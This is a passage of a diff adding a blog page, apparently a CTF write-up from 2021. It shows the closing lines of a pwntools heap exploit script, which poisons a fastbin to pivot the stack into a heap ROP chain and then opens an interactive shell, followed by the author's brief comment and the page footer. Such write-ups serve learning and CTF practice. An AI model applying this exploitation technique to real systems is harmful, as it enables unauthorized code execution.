+    </span><span style="color:#ffd580;">poison_fastbin</span><span style="color:#ccc9c2;">(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">stack_ret</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rsp) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(heap_rop_address) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">))
+
+
+    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span style="color:#ccc9c2;">()
+
+
+</span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span style="color:#ccc9c2;">:
+    </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">()
+</span></code></pre>
+<p>Neat challenge!  I'm still rather new to complex heap challenges so this fucked me up, but I had a good time working on it!</p>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date"> 9 May 2021</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://heinen.dev/tags/ctf-writeups/">#ctf-writeups</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+</body>
+</html>
